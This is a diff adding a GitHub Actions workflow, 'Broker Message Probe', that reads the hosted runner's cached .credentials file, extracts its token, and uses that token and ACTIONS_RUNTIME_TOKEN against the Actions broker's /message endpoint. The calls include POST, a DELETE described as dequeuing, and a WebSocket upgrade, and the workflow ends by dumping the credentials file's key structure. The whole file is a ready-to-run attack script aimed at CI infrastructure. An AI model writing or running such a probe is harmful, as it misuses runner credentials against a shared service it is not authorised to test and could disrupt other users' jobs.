@@ -1,0 +1,69 @@
+name: Broker Message Probe
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe broker /message endpoint
+        run: |
+          BROKER="https://broker.actions.githubusercontent.com"
+          CREDS="/home/runner/actions-runner/cached/2.335.1/.credentials"
+          TOKEN=$(python3 -c "import json; d=json.load(open('$CREDS')); print(d.get('Data',{}).get('token',''))" 2>/dev/null)
+          
+          echo "=== /message unauthenticated ==="
+          curl -sv --max-time 3 "$BROKER/message" 2>&1 | grep -E "< HTTP|< content|< x-|< www-auth|error|Unauthorized"
+          
+          echo ""
+          echo "=== /message with runner .credentials token ==="
+          curl -s -w "\nHTTP:%{http_code}" --max-time 3 \
+            -H "Authorization: Bearer $TOKEN" "$BROKER/message"
+          
+          echo ""
+          echo "=== /message with ACTIONS_RUNTIME_TOKEN ==="
+          curl -s -w "\nHTTP:%{http_code}" --max-time 3 \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$BROKER/message"
+          
+          echo ""
+          echo "=== /message POST with runner token ==="
+          curl -s -w "\nHTTP:%{http_code}" --max-time 3 -X POST \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Content-Type: application/json" \
+            "$BROKER/message" -d '{}'
+          
+          echo ""
+          echo "=== /message DELETE (dequeue) with runner token ==="
+          curl -s -w "\nHTTP:%{http_code}" --max-time 3 -X DELETE \
+            -H "Authorization: Bearer $TOKEN" "$BROKER/message"
+          
+          echo ""
+          echo "=== WebSocket upgrade on /message ==="
+          curl -s -w "\nHTTP:%{http_code}" --max-time 3 \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Connection: Upgrade" \
+            -H "Upgrade: websocket" \
+            -H "Sec-WebSocket-Version: 13" \
+            -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
+            "$BROKER/message" | head -5
+          
+          echo ""
+          echo "=== Full credentials file structure (keys only) ==="
+          python3 -c "
+          import json
+          with open('$CREDS') as f:
+              d = json.load(f)
+          def show_keys(obj, prefix=''):
+              if isinstance(obj, dict):
+                  for k,v in obj.items():
+                      if isinstance(v, (dict,list)):
+                          show_keys(v, f'{prefix}.{k}')
+                      else:
+                          val_type = type(v).__name__
+                          val_len = len(str(v)) if v else 0
+                          print(f'{prefix}.{k}: {val_type}({val_len})')
+              elif isinstance(obj, list):
+                  for i,v in enumerate(obj):
+                      show_keys(v, f'{prefix}[{i}]')
+          show_keys(d)
+          " 2>/dev/null
